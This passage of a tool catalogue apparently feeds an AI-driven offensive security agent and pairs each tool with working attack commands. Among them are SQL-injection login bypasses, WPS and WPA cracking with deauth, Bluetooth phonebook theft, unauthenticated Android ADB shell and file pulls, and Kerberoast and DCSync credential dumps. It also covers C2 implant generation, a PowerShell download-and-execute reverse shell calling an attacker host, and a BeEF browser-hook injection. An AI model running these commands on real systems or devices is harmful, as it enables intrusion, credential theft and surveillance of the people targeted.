  { name: 'gcpbucketbrute', category: 'cloud', summary: 'Enumerate Google Cloud Storage buckets by keyword and test for public/insecure permissions.',
    help: '-k <keyword>\n-u (unauthenticated)', example: 'gcpbucketbrute -k targetname -u' },
  { name: 'lazys3', category: 'cloud', summary: 'Brute-force AWS S3 bucket names using common permutations of a company/keyword.',
    help: 'ruby lazys3.rb <keyword>', example: 'lazys3 targetname' },
  // --- IAM analysis ---
  { name: 'cloudsplaining', category: 'cloud', summary: 'Scan an AWS IAM account authorization dump for over-permissive policies (priv-esc, data exfil, resource exposure).',
    help: 'download\nscan --input-file auth.json', example: 'cloudsplaining scan --input-file account.json' },
  { name: 'pmapper', category: 'cloud', summary: 'Model IAM users/roles as a graph and find privilege-escalation paths to admin.',
    help: 'graph create\nquery "preset privesc *"', example: 'pmapper query "preset privesc *"' },
  { name: 'parliament', category: 'cloud', summary: 'Lint AWS IAM policies for errors, typos and overly-broad permissions.',
    help: '--file policy.json\n--string', example: 'parliament --file policy.json' },
  // --- default credentials ---
  { name: 'changeme', category: 'password', summary: 'Default-credential scanner for admin panels, routers, databases and web apps (huge built-in cred set).',
    help: '<target>\n--protocols http,ssh\n-n', example: 'changeme https://target.com' },
  { name: 'ncrack', category: 'password', summary: 'High-speed network authentication cracker (SSH, RDP, FTP, HTTP, VNC, SMB) — good for default-cred testing.',
    help: '-p <proto>\n--user admin\n--pass admin', example: 'ncrack -p rdp --user admin --pass admin 10.0.0.5' },
  // --- exposed databases / dashboards / control-plane APIs (Phase 6) ---
  { name: 'httpx', category: 'exposure', summary: 'Fast multi-purpose HTTP probe — status/title/tech/ports; ideal for finding exposed panels, dashboards and services across many hosts/ports.',
    help: '-u URL\n-ports 9200,5601,3000,2375\n-title -status-code -tech-detect\n-json', example: 'httpx -u https://target.com -ports 9200,5601,3000,2375,8080 -title -status-code -tech-detect' },
  { name: 'kube-hunter', category: 'exposure', summary: 'Hunt for exposed/insecure Kubernetes components — API server, kubelet (:10250), dashboard, etcd — and known cluster CVEs.',
    help: '--remote <host>\n--report json', example: 'kube-hunter --remote target.com --report json' },
  { name: 'redis-cli', category: 'exposure', summary: 'Redis client — connect to a Redis port to test for UNAUTHENTICATED access (INFO/CONFIG GET/KEYS *).',
    help: '-h <host> -p 6379\nINFO\nCONFIG GET *', example: 'redis-cli -h target.com -p 6379 INFO server' },
  { name: 'elasticdump', category: 'exposure', summary: 'Read/dump data from an exposed Elasticsearch/OpenSearch index (confirms unauthenticated data exposure).',
    help: '--input=http://host:9200/index --output=$ --type=data', example: 'curl -s http://target.com:9200/_cat/indices?v' },
  { name: 'nuclei-exposures', category: 'exposure', summary: 'nuclei template packs for exposures: run with -tags exposure,config,panel,misconfiguration to flag exposed dashboards, actuator, .git, backups.',
    help: 'nuclei -u URL -tags exposure,panel,config\n-severity medium,high,critical', example: 'nuclei -u https://target.com -tags exposure,panel,config,misconfiguration -nc' },
  // --- firewall & network segmentation review (Phase 7) ---
  { name: 'nmap-firewall', category: 'network', summary: 'nmap for perimeter review: service scan + ACK scan (-sA) to detect stateful firewalls, and flag internal-tier ports (SSH/RDP/SMB/DB/Docker/k8s) exposed to the internet.',
    help: '-Pn -sV --reason -p <ports>\n-sA (ACK firewall detect)\n-p- (all ports)', example: 'nmap -Pn -T4 -sV --reason -p22,3306,6379,2375,3389 target.com' },
  { name: 'wafw00f', category: 'network', summary: 'Detect and fingerprint the Web Application Firewall / CDN in front of a site (Cloudflare, Akamai, AWS WAF, ModSecurity…).',
    help: 'https://target.com\n-a (all)\n-l (list WAFs)', example: 'wafw00f https://target.com' },
  { name: 'hping3', category: 'network', summary: 'Custom TCP/IP packet crafting — firewall rule testing, ACL probing, source-port/fragmentation bypass checks.',
    help: '-S -p 80 --flood\n-c 3 -V\n--scan', example: 'hping3 -S -p 80 -c 3 target.com' },
  { name: 'firewalk', category: 'network', summary: 'Probe firewall ACLs by using TTL expiry to learn which ports/protocols a gateway forwards (network segmentation mapping).',
    help: '-S<start>-<end> -pTCP\n<gateway> <target>', example: 'firewalk -S1-100 -pTCP gateway target' },
  // --- SMB/FTP/SSH/RDP service config audit (Phase 8) ---
  { name: 'ssh-audit', category: 'service-config', summary: 'Audit an SSH server config: weak key-exchange, ciphers, MACs, host-key types, algorithm CVEs and hardening advice.',
    help: '<host>\n-p 22\n--json', example: 'ssh-audit target.com' },
  { name: 'enum4linux', category: 'service-config', summary: 'Enumerate SMB/Samba: null sessions, shares, users, groups, password policy, OS — the classic SMB config-audit tool.',
    help: '-a <host>\n-U users\n-S shares', example: 'enum4linux -a target.com' },
  { name: 'enum4linux-ng', category: 'service-config', summary: 'Modern rewrite of enum4linux (SMB/RPC enumeration) with JSON/YAML output.',
    help: '-A <host>\n-oJ out', example: 'enum4linux-ng -A target.com' },
  { name: 'smbclient', category: 'service-config', summary: 'SMB client — list shares and test anonymous/null-session access (smbclient -L -N).',
    help: '-L //host -N\n-U user', example: 'smbclient -L //target.com -N' },
  { name: 'smbmap', category: 'service-config', summary: 'Enumerate SMB shares and their read/write permissions across a host (null session or creds).',
    help: '-H <host>\n-u null -p ""', example: 'smbmap -H target.com' },
  { name: 'nmap-nse-services', category: 'service-config', summary: 'nmap NSE scripts for service hardening: ssh2-enum-algos, smb-security-mode, smb-protocols, ftp-anon, rdp-enum-encryption, rdp-vuln-ms12-020, smb-vuln-ms17-010.',
    help: '--script ssh2-enum-algos,smb-security-mode,ftp-anon,rdp-enum-encryption\n-p22,21,445,3389', example: 'nmap -p22,445,3389 --script ssh2-enum-algos,smb-security-mode,rdp-enum-encryption target.com' },
  // --- file-upload / rate-limit / input-validation (Phase 9) ---
  { name: 'ffuf', category: 'input-testing', summary: 'Fast web fuzzer — brute-force parameters, values and paths; useful for input-validation and upload-endpoint discovery (already listed under web).',
    help: '-u URL/FUZZ\n-w wordlist\n-mc 200,403', example: 'ffuf -u https://target.com/FUZZ -w list.txt -mc 200,403' },
  { name: 'dalfox', category: 'input-testing', summary: 'Parameter-analysis XSS scanner — tests reflected/stored/DOM XSS with encoding-aware payloads and verification.',
    help: 'url <url>\n-b blind.xss\n--custom-payload', example: 'dalfox url "https://target.com/search?q=1"' },
  { name: 'sqlmap', category: 'input-testing', summary: 'Automatic SQL injection detection & exploitation across GET/POST params, headers and cookies (input-validation of DB layer).',
    help: '-u URL\n--forms --batch\n--level 2 --risk 2', example: 'sqlmap -u "https://target.com/item?id=1" --batch' },
  { name: 'fuxploider', category: 'input-testing', summary: 'Automated file-upload vulnerability scanner — detects allowed extensions and unrestricted-upload bypasses.',
    help: '-u URL\n--not-regex', example: 'fuxploider -u https://target.com/upload' },
  { name: 'ratelimit-probe', category: 'input-testing', summary: 'Send a burst of requests and inspect for HTTP 429 / RateLimit-* / Retry-After headers to confirm throttling exists on auth/API endpoints.',
    help: 'for i in $(seq 1 30); do curl -s -o /dev/null -w "%{http_code}\\n" URL; done', example: 'for i in $(seq 1 30); do curl -s -o /dev/null -w "%{http_code}\\n" https://target.com/login; done | sort | uniq -c' },
  // --- API endpoint & parameter discovery (Phase 10) ---
  { name: 'kiterunner', category: 'api-discovery', summary: 'Content discovery built for APIs — brute-forces API routes/params using route-based wordlists (kr) far better than dir brute-forcers.',
    help: 'scan <url> -w routes.kite\nkb scan', example: 'kr scan https://target.com -w routes-large.kite' },
  { name: 'arjun', category: 'api-discovery', summary: 'HTTP parameter discovery — finds hidden GET/POST/JSON query parameters an endpoint accepts.',
    help: '-u URL\n-m GET,POST,JSON', example: 'arjun -u https://target.com/api/item' },
  { name: 'gau', category: 'api-discovery', summary: 'getallurls — pull known URLs (with params) for a domain from Wayback/CommonCrawl/OTX to seed endpoint & parameter discovery.',
    help: '<domain>\n--subs\n--o out.txt', example: 'gau target.com' },
  { name: 'hakrawler', category: 'api-discovery', summary: 'Fast web crawler that extracts endpoints, JS URLs and params from a site for API surface mapping.',
    help: '-url URL\n-depth 2\n-js', example: 'echo https://target.com | hakrawler -depth 2' },
  { name: 'linkfinder', category: 'api-discovery', summary: 'Extract endpoints/paths hidden inside a web app\'s JavaScript files (regex over JS bundles).',
    help: '-i <url|jsfile>\n-o cli\n-d domain', example: 'linkfinder -i https://target.com -o cli' },
  { name: 'graphql-introspect', category: 'api-discovery', summary: 'Send a GraphQL introspection query to enumerate the full schema (types, queries, mutations) when introspection is left enabled.',
    help: 'POST {"query":"{__schema{types{name}}}"} to /graphql', example: 'curl -s -d \'{"query":"{__schema{queryType{name}}}"}\' -H "Content-Type: application/json" https://target.com/graphql' },
  // --- authentication & session weaknesses (Phase 11) ---
  { name: 'jwt_tool', category: 'auth-session', summary: 'Analyse/tamper JWTs — decode, test alg:none & key-confusion (RS256->HS256), weak-secret crack, expiry & claim checks.',
    help: '<token>\n-M pb (playbook)\n-C -d wordlist (crack)', example: 'jwt_tool eyJhbGciOi... -M pb' },
  { name: 'cookie-flags', category: 'auth-session', summary: 'Inspect Set-Cookie flags (Secure, HttpOnly, SameSite) on session/auth cookies via response headers.',
    help: 'curl -sI URL | grep -i set-cookie', example: 'curl -sI https://target.com | grep -i set-cookie' },
  { name: 'cors-scanner', category: 'auth-session', summary: 'Test CORS: send a forged Origin and check if Access-Control-Allow-Origin reflects it (with Allow-Credentials:true = critical).',
    help: 'curl -H "Origin: https://evil.com" -I URL', example: 'curl -s -H "Origin: https://evil.example" -D - -o /dev/null https://target.com | grep -i access-control' },
  { name: 'testssl.sh', category: 'auth-session', summary: 'Deep TLS/SSL config + HSTS/cookie-security tester — protocols, ciphers, cert, HSTS, secure-cookie flags.',
    help: '<url>\n--fast\n--headers', example: 'testssl.sh --fast https://target.com' },
  // --- strengthened reconnaissance (domain/subdomain/DNS/IP/tech/asset inventory) ---
  { name: 'subfinder', category: 'recon', summary: 'Fast passive subdomain enumeration from dozens of sources (crt.sh, VirusTotal, etc.).',
    help: '-d domain\n-silent\n-all', example: 'subfinder -d target.com -silent' },
  { name: 'crt.sh', category: 'recon', summary: 'Certificate Transparency search — passively enumerate subdomains from issued TLS certs (no touching the target).',
    help: 'curl "https://crt.sh/?q=%25.DOMAIN&output=json" | jq -r .[].name_value', example: 'curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r ".[].name_value" | sort -u' },
  { name: 'dnsx', category: 'recon', summary: 'Fast DNS toolkit — resolve/validate hosts, bruteforce subdomains, pull A/AAAA/CNAME/NS/MX records.',
    help: '-l hosts.txt -resp\n-a -aaaa -cname\n-sub -w words', example: 'dnsx -d target.com -sub -w subs.txt -resp' },
  { name: 'httpx', category: 'recon', summary: 'Probe hosts for live HTTP(S): status, title, tech-detect, server, CDN, TLS — turns a subdomain list into a live-asset inventory.',
    help: '-l hosts.txt\n-title -tech-detect -status-code -cdn\n-json', example: 'httpx -l subs.txt -title -tech-detect -status-code -cdn' },
  { name: 'dnsrecon', category: 'recon', summary: 'DNS enumeration incl. records, zone transfer (AXFR), subdomain brute, reverse lookups, SRV.',
    help: '-d domain\n-a (AXFR)\n-D wordlist -t brt', example: 'dnsrecon -d target.com -a' },
  { name: 'sublist3r', category: 'recon', summary: 'Passive subdomain enumeration via search engines + sources (a classic, alongside subfinder/amass). Output feeds httpx to find live assets. Recognized by the subdomain parser → subdomains become findings.',
    help: '-d domain\n-t threads\n-o out.txt\n-e bing,google,yahoo', example: 'sublist3r -d target.com -o subs.txt' },
  { name: 'rustscan', category: 'recon', summary: 'Ultra-fast Rust port scanner — finds open ports in seconds, then hands them to nmap for service/version detection (rustscan -a <ip> -- -sV). Great first pass before a deep nmap; complements masscan.',
    help: 'rustscan -a <ip>\nrustscan -a <ip> -r 1-65535 -- -sV -sC\nrustscan -a <ip> --ulimit 5000', example: 'rustscan -a 10.0.0.5 -- -sV -sC' },
  { name: 'gowitness', category: 'recon', summary: 'Screenshot web pages at scale (headless Chrome) — turn an httpx/subfinder live-host list into a visual triage gallery to spot login panels, default pages and dashboards fast.',
    help: 'gowitness scan file -f hosts.txt\ngowitness scan single -u https://target.com\ngowitness report serve', example: 'gowitness scan file -f live-hosts.txt' },
  { name: 'asnmap', category: 'recon', summary: 'Map an organisation/IP/domain to its ASN and CIDR ranges — scope discovery for the owned IP space.',
    help: '-d domain\n-a AS13335\n-i IP', example: 'asnmap -d target.com' },
  // --- SQLi login / authentication bypass (Phase 12) ---
  { name: 'sqli-login-bypass', category: 'auth-bypass', summary: 'Submit classic SQL-injection auth-bypass payloads (\' OR 1=1 --, admin\' --, \' OR \'1\'=\'1, …) to a login form and detect a real bypass (redirect/session/failure-marker gone vs a junk-cred baseline).',
    help: '<login-url>\nuser=<field> pass=<field>', example: "curl -s -c j -b j --data-urlencode \"username=' OR 1=1 --\" --data-urlencode \"password=x\" https://target.com/login" },
  { name: 'sqlmap-auth', category: 'auth-bypass', summary: 'Use sqlmap against a login POST to confirm/exploit SQLi in the auth query (dump users, bypass).',
    help: '-u URL --data "user=a&pass=b"\n--batch --level 2 --risk 2', example: 'sqlmap -u https://target.com/login --data "username=a&password=b" --batch --level 2' },
  { name: 'ghauri', category: 'auth-bypass', summary: 'Fast SQL-injection detection/exploitation tool (sqlmap alternative) — good on login parameters and auth bypass.',
    help: '-u URL --data "..."\n--batch', example: 'ghauri -u https://target.com/login --data "username=a&password=b" --batch' },
  // --- Google-dork / search-engine OSINT recon ---
  { name: 'google-dorks', category: 'osint', summary: 'Automated Google/Bing/DDG dork sweep: exposed .env/config/backup/log files, admin panels, open dirs, SQL errors, .git, and Pastebin/GitHub/cloud leaks for a target domain.',
    help: 'site:target ext:env|conf|bak\ninurl:admin|login\nintitle:"index of"\nsite:pastebin.com "target"', example: 'site:target.com ext:env | ext:conf | ext:bak' },
  { name: 'GHDB', category: 'osint', summary: 'Google Hacking Database (exploit-db.com/google-hacking-database) — thousands of categorised dorks for finding exposed files, cameras, portals and vulnerable servers.',
    help: 'browse categories: Files Containing Passwords, Sensitive Directories, Web Server Detection', example: 'site:target.com intext:"index of /" .env' },
  { name: 'pagodo', category: 'osint', summary: 'Automate Google dorking at scale (GHDB dork list) to passively enumerate a target\'s exposed assets.',
    help: '-d domain -g dorks.txt\n-l 50 -s', example: 'pagodo -d target.com -g ghdb_dorks.txt -l 50' },
  { name: 'waymore', category: 'osint', summary: 'Pull a target\'s historical URLs (with params) from Wayback/CommonCrawl/URLScan/VirusTotal — great for finding old exposed endpoints & files.',
    help: '-i domain -mode U', example: 'waymore -i target.com -mode U' },
  { name: 'shodan', category: 'osint', summary: 'Internet device/service search engine. Prefer the built-in ```shodan tag (host lookups with open ports + CVEs, banner search by org/ssl/product/port, subdomain+DNS enumeration, reverse-DNS) — passive, no packets to the target. CLI also available in the sandbox.',
    help: '```shodan host <ip> | domain <d> | search <query> | count <query>\nCLI: shodan host <ip> / shodan search <query> / shodan domain <d>', example: 'shodan search \'ssl:"Target Inc" http.title:"admin"\'' },
  { name: 'reaver', category: 'wireless', summary: 'WPS attack tool — brute-forces the WPS PIN to recover the WPA/WPA2 passphrase. Prefer the ```wireless tag (wpsscan|pixie|wps) which auto-detects the adapter + monitor mode. Needs a monitor-mode radio on the exec host; without one the tool honestly reports WIRELESS-NOADAPTER (never fake).',
    help: [
      '```wireless wpsscan                    find WPS-enabled APs (wash) — do this FIRST',
      '```wireless pixie <BSSID> [channel]    Pixie-Dust attack (seconds, where vulnerable) — TRY FIRST',
      '```wireless wps <BSSID> [channel]      standard PIN brute-force (slow, hours)',
      'raw: reaver -i <mon> -b <BSSID> -vv           standard brute-force',
      'raw: reaver -i <mon> -b <BSSID> -K 1 -vv      Pixie-Dust (fast)',
      'raw: reaver -i <mon> -b <BSSID> -c <ch> -f    lock to a channel (no hopping)',
      'raw: reaver -i <mon> -b <BSSID> -p <PIN>      test a specific PIN',
      'raw: reaver -i <mon> -b <BSSID> -d 30 -l 120  delay + lock-wait (evade rate limiting)',
      'raw: reaver -i <mon> -b <BSSID> -S -N         small DH keys + no NACK (faster on some APs)',
    ].join('\n'),
    example: 'reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv   # pixie-dust' },
  { name: 'wash', category: 'wireless', summary: 'Scans for WPS-enabled access points (the recon step before reaver). Shows BSSID, channel, WPS version and whether WPS is LOCKED. Use via ```wireless wpsscan.',
    help: 'wash -i <mon>\nwash -i <mon> -c <channel>\nwash -i <mon> -s   (show already-seen)', example: 'wash -i wlan0mon' },
  { name: 'aircrack-ng', category: 'wireless', summary: 'Wi-Fi security suite (airmon-ng/airodump-ng/aireplay-ng/aircrack-ng). Prefer the ```wireless tag (scan|monitor|capture|deauth|crack) — it auto-detects the adapter, puts it in monitor mode, and cracks handshakes with rockyou. Cracking a captured .cap is OFFLINE (no radio needed); scan/capture/deauth need a monitor-mode radio on the exec host.',
    help: [
      '```wireless scan                       list nearby APs (airodump-ng)',
      '```wireless capture <BSSID> <channel>  capture the WPA handshake',
      '```wireless deauth <BSSID>             deauth clients (forces a handshake)',
      '```wireless crack <BSSID>              crack the .cap with rockyou (offline)',
      'raw: airmon-ng start <iface>                       enable monitor mode',
      'raw: airodump-ng --bssid <B> -c <ch> -w cap <mon>  capture to cap-01.cap',
      'raw: aireplay-ng --deauth 10 -a <B> <mon>          deauth attack',
      'raw: aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <B> cap-01.cap   crack',
    ].join('\n'),
    example: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap' },
  { name: 'bluesnarfer', category: 'bluetooth', summary: 'BlueSnarf attack tool — pulls a target phone\'s device info, phonebook/contacts and dialed/received/missed call logs over OBEX/AT. Prefer the ```bluetooth tag (auto-detects the adapter). Needs a REAL Bluetooth radio near the target on the exec host; no radio -> honest BT-NOADAPTER (never faked). Exfiltrated contacts/IMEI become findings.',
    help: [
      '```bluetooth check                          confirm a BT adapter is present (do this FIRST)',
      '```bluetooth scan                           discover nearby devices (MAC + name)',
      '```bluetooth services <mac>                 find the RFCOMM/phonebook channel',
      '```bluetooth contacts <mac> <chan> [range] [TYPE]   read phonebook (TYPE: SM=SIM, ME=phone)',
      '```bluetooth calls <mac> <chan> [range] <TYPE>      call list (DC dialed / RC received / MC missed)',
      '```bluetooth search <mac> <chan> <name>     search the phonebook for a name',
      '```bluetooth info-snarf <mac> <chan>        device info (model/manufacturer/IMEI)',
      '```bluetooth list-storage <mac> <chan>      list phonebook memory storages',
      '```bluetooth custom <mac> <chan> <AT+CMD>   send a raw AT command',
      '--- raw bluesnarfer flags (from the cheat sheet): ---',
      'bluesnarfer -b <mac> -C <chan> -r N-M    read phonebook · -w N-M delete · -f <name> search',
      'bluesnarfer -b <mac> -C <chan> -s <TYPE> select storage · -l list storages · -i device info',
      'bluesnarfer -b <mac> -C <chan> -c <ATCMD>  custom AT action',
    ].join('\n'),
    example: 'bluesnarfer -b AA:BB:CC:DD:EE:FF -C 3 -r 1-100   # dump the phonebook' },
  { name: 'bluetooth-recon', category: 'bluetooth', summary: 'Bluetooth discovery/enumeration via BlueZ (hcitool/sdptool/l2ping). Discover devices, enumerate services/RFCOMM channels, check reachability, or L2CAP-flood (BlueSmack DoS). Use via the ```bluetooth tag (adapter auto-detected; honest no-radio message).',
    help: 'hcitool scan  /  hcitool lescan  (BLE)\nsdptool browse <mac>   (services/channels)\nl2ping -c 5 <mac>  (reachability)\nl2ping -s 600 -f <mac>  (BlueSmack flood)', example: 'sdptool browse AA:BB:CC:DD:EE:FF' },
  { name: 'ghost-framework', category: 'android', summary: 'Android remote access / post-exploitation over ADB (EntynetProject Ghost Framework). Connects to a device with ADB-over-network enabled (tcp/5555) — a real, unauthenticated remote shell (ADB.Miner). Prefer the ```ghost tag (self-installs adb; connect → enumerate → pull/screenshot/control). Needs the target :5555 reachable from the exec backend (or a USB device); no reachable device -> honest GHOST-NODEVICE (never faked). Exposed ADB + live sessions become findings. AUTHORIZED devices only (gated).',
    help: [
      '```ghost check                     adb present? any devices? (do this FIRST)',
      '```ghost scan <cidr>               find exposed ADB (nmap -p 5555 --open) — the vuln',
      '```ghost connect <ip>              connect over ADB-TCP (default :5555)',
      '```ghost sysinfo <ip>              device model / Android version / serial',
      '```ghost apps <ip>                 list installed (third-party) apps',
      '```ghost screenshot <ip>           screencap + pull to the workspace',
      '```ghost pull <ip> <remote> [local]   pull files (e.g. /sdcard/DCIM)',
      '```ghost shell <ip> <cmd>          run any shell command on the device',
      '```ghost current <ip>              current foreground activity',
      '```ghost input <ip> <keycode>      button press (26=power 3=home 4=back 66=enter)',
      '--- raw adb (self-installed): ---',
      'adb connect <ip>:5555 · adb -s <ip>:5555 shell <cmd> · adb -s <ip>:5555 pull <path>',
    ].join('\n'),
    example: 'adb connect 192.168.1.20:5555 && adb -s 192.168.1.20:5555 shell getprop ro.product.model' },
  { name: 'adb', category: 'android', summary: 'Android Debug Bridge — the CLI Ghost/this tag drives. Connect over USB or TCP (adb connect ip:5555), get a device shell, push/pull files, install/uninstall APKs, screencap/screenrecord, dumpsys, input events, reboot. Exposed adb-over-network (:5555) is an unauthenticated device takeover. Use via the ```ghost tag.',
    help: 'adb devices -l\nadb connect <ip>:5555\nadb -s <ser> shell <cmd>\nadb -s <ser> pull <remote> <local>\nadb -s <ser> install app.apk\nadb -s <ser> shell screencap -p /sdcard/s.png', example: 'adb -s 192.168.1.20:5555 shell pm list packages -3' },
  { name: 'scrcpy', category: 'android', summary: 'Mirror + control an Android device screen over ADB (live view of a connected device). Handy after ```ghost connect to watch/drive the target. Needs a display; for headless enumeration use the ```ghost tag actions instead.',
    help: 'scrcpy -s <ip>:5555            mirror the connected device\nscrcpy --record file.mp4       mirror + record', example: 'scrcpy -s 192.168.1.20:5555' },
  { name: 'bloodhound', category: 'activedirectory', summary: 'Active Directory attack-path mapper — graphs users/groups/computers/ACLs to reveal escalation routes to Domain Admin (Kerberoast, delegation, DCSync, ACL abuse, admin paths). Prefer the built-in ```ad tag: it collects with the LINUX bloodhound-python collector (no SharpHound.exe/Windows needed) and runs an offline attack-path analyzer → findings. Needs valid domain creds + reachability to a DC.',
    help: [
      '```ad collect <domain> u=<user> p=<pass> dc=<dc-ip>   LDAP-collect AD data (bloodhound-python)',
      '```ad analyze                                          offline attack-path findings from the JSON',
      '```ad kerberoast <domain> u= p= dc=                    GetUserSPNs → $krb5tgs (hashcat -m 13100)',
      '```ad asreproast <domain> dc= [u= p= | file=users]     GetNPUsers → $krb5asrep (hashcat -m 18200)',
      '```ad dcsync <domain> u= p= dc=                        secretsdump -just-dc (needs repl rights)',
      '--- optional GUI: ingest the JSON into Neo4j + BloodHound for graph queries ---',
    ].join('\n'),
    example: 'bloodhound-python -u jdoe -p Passw0rd -d corp.local -dc dc01.corp.local -ns 10.0.0.10 -c All --zip' },
  { name: 'sharphound', category: 'activedirectory', summary: 'The Windows/C# BloodHound collector (SharpHound.exe / .ps1) — run on a domain-joined Windows host to gather AD data (-c All) into a zip you ingest into BloodHound. On Kali prefer bloodhound-python via the ```ad tag (same data, no Windows). Use SharpHound when you already have code-exec on a Windows box.',
    help: 'SharpHound.exe -c All\nSharpHound.exe -c All --zipfilename cm.zip\n(PowerShell) Invoke-BloodHound -CollectionMethod All', example: 'SharpHound.exe -c All -d corp.local' },
  { name: 'impacket', category: 'activedirectory', summary: 'Impacket AD toolkit — the engine behind the ```ad quick-wins: GetUserSPNs (Kerberoast), GetNPUsers (AS-REP roast), secretsdump (DCSync/SAM/LSA), plus wmiexec/psexec/smbexec/dcomexec (remote exec), ntlmrelayx (relay), mssqlclient. Needs domain creds + DC reachability.',
    help: [
      'impacket-GetUserSPNs corp.local/jdoe:Passw0rd -dc-ip 10.0.0.10 -request   kerberoast',
      'impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.10 -no-pass -format hashcat   AS-REP',
      'impacket-secretsdump corp.local/jdoe:Passw0rd@10.0.0.10 -just-dc          DCSync hashes',
      'impacket-wmiexec corp.local/jdoe:Passw0rd@10.0.0.20                       remote shell',
    ].join('\n'),
    example: 'impacket-GetUserSPNs corp.local/jdoe:Passw0rd -dc-ip 10.0.0.10 -request' },
  { name: 'pwntools', category: 'exploitdev', summary: 'The exploit-dev framework (CTF/binary exploitation). Prefer the built-in ```exploitdev tag for the workflow: cyclic pattern create/offset (buffer-overflow offset discovery), exploit scaffolds (BOF/ROP/format-string/shellcode/web), checksec, compile, ROP gadgets. pwntools itself: process/remote I/O, ELF/ROP, shellcraft, asm/disasm, cyclic.',
    help: [
      '```exploitdev pattern 200         cyclic De Bruijn pattern (offset discovery)',
      '```exploitdev offset <EIP-value>  byte offset from the crash value',
      '```exploitdev template python bof exploit scaffold (lang: python|c|go; vuln: bof|rop|fmt|shellcode|web)',
      '```exploitdev checksec ./target   NX/canary/PIE/RELRO',
      '```exploitdev gadgets ./target    ROP gadgets (ROPgadget)',
      '--- raw pwntools: ---',
      'from pwn import *; io=process("./t"); io.sendline(cyclic(200)); ELF("./t"); ROP(elf)',
    ].join('\n'),
    example: 'from pwn import *; p = cyclic(200); io = process("./target"); io.sendline(p)' },
  { name: 'gdb-gef', category: 'exploitdev', summary: 'GDB with GEF/pwndbg for dynamic binary analysis during exploit dev — inspect registers/stack/heap on crash, find the offset (pattern search), locate jmp esp / gadgets, check protections. Pairs with the ```exploitdev tag (build the pattern here, debug the crash in gdb).',
    help: 'gdb ./target\ngef> pattern create 200\ngef> run   (crash) ; gef> pattern search $eip\ngef> checksec\ngef> ropgadget --binary ./target', example: 'gdb -q ./target -ex "pattern create 200"' },
  { name: 'ropgadget', category: 'exploitdev', summary: 'Find ROP gadgets in a binary/library to build ROP chains (bypass NX/DEP). Use via ```exploitdev gadgets <binary>. Filter by instruction, dump strings, build a rop chain skeleton.',
    help: 'ROPgadget --binary ./target\nROPgadget --binary ./target --only "pop|ret"\nROPgadget --binary libc.so.6 --string "/bin/sh"', example: 'ROPgadget --binary ./target --only "pop|ret"' },
  { name: 'sliver', category: 'c2', summary: 'Sliver — modern cross-platform C2 (BishopFox) for AUTHORIZED red-team/adversary-emulation. Server + implants over mTLS/HTTP(S)/DNS/WireGuard. Run the listener via ```execute — it AUTO-becomes a Live Hack Environment (persistent job) so implant sessions stay alive and you drive them from the management box. Generate an implant, start a listener, wait for the callback, then interact (shell, download, execute-assembly, pivot).',
    help: [
      'sliver-server                                   start the server console',
      'https --lport 443                               start an HTTPS listener (stays alive → live job)',
      'mtls --lport 8443                               mTLS listener',
      'generate --mtls <lhost>:8443 --os windows --arch amd64 --format exe --save /tmp/imp.exe   build an implant',
      'generate beacon --http <lhost> --os windows --save /tmp/b.exe   a beacon (low-and-slow)',
      'sessions            /  use <id>                 list / select a live session',
      'shell   /  execute -o whoami  /  download <f>  /  upload <f>     interact with the session',
      'armory install <name>          add extensions (e.g. seatbelt, sharphound)',
    ].join('\n'),
    example: 'sliver-server; https --lport 443; generate --http <lhost> --os windows --save /tmp/imp.exe' },
  { name: 'havoc', category: 'c2', summary: 'Havoc — modern open-source C2 (teamserver + Demon agent) for AUTHORIZED red-team. Start the teamserver (stays alive → Live Hack Environment), connect the client, build a Demon agent for a listener, catch the callback and drive the agent (shell, BOF/object-file exec, token, pivot).',
    help: [
      'havoc server --profile ./profile.yaotl -v      start the teamserver (persistent → live job)',
      'havoc client                                    connect the operator GUI/CLI',
      '# in client: Listeners -> add (HTTP/HTTPS) ; Payload -> build Demon (exe/dll/shellcode)',
      'demon> shell whoami  /  dll-spawn  /  proc list  /  pivot',
    ].join('\n'),
    example: 'havoc server --profile profile.yaotl -v' },
  { name: 'covenant', category: 'c2', summary: 'Covenant — .NET C2 (Grunt implants) for AUTHORIZED red-team on Windows/.NET estates. Run the server (ASP.NET; stays alive → Live Hack Environment), create an HTTP listener, generate a Grunt launcher (PowerShell/Binary/MSBuild), catch the Grunt and task it.',
    help: [
      'dotnet Covenant.dll                             start the server (web UI :7443)',
      '# UI: Listeners -> Create (HTTP) ; Launchers -> generate (PowerShell/Binary/MSBuild)',
      'grunt> Shell whoami  /  Assembly  /  Mimikatz  /  Rubeus  /  PortScan',
    ].join('\n'),
    example: 'dotnet Covenant.dll' },
  { name: 'nishang', category: 'exploit', summary: 'Nishang — offensive PowerShell scripts for pentest/red-team (reverse/bind shells, download-exec, gather, escalation, exfil). AUTHORIZED use; delivered where you already have exec on a Windows host. For a quick pwsh reverse shell prefer ```set powershell-reverse; use Nishang for the broader script arsenal.',
    help: [
      'Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port 4444   reverse shell',
      'Import-Module ./nishang.psm1 ; Get-Command -Module nishang     list scripts',
      'Invoke-Mimikatz  /  Invoke-PortScan  /  Get-Information         post-ex modules',
    ].join('\n'),
    example: 'powershell IEX (New-Object Net.WebClient).DownloadString("http://<lhost>/Invoke-PowerShellTcp.ps1"); Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port 4444' },
  { name: 'beef-xss', category: 'exploit', summary: 'BeEF — Browser Exploitation Framework. Hooks a victim browser via hook.js (delivered by XSS/phishing) and controls it from a web panel + REST API: browser/network recon, steal cookies, keylog, screenshot, fake dialogs, redirect, social-engineering, persistence. Get the hook + delivery payloads via ```payload beef <your-ip>. NOTE: hooking REQUIRES a victim to load hook.js — BeEF cannot hook a browser by itself; it is a server, not a one-shot CLI.',
    help: [
      'cd /usr/share/beef-xss && bundle exec ./beef  start the BeEF server (panel on :3000)',
      'http://<you>:3000/ui/panel                    admin panel (sandbox creds beef:CypherM1nd! — BeEF REFUSES beef:beef)',
      'hook: <script src="http://<you>:3000/hook.js"></script>   inject via XSS/phishing to hook a browser',
      'REST API: POST /api/admin/login {user,pass} -> token; GET /api/hooks?token=..   list hooked browsers',
      'GET /api/hooks/<session>?token=..              details of one hooked browser',
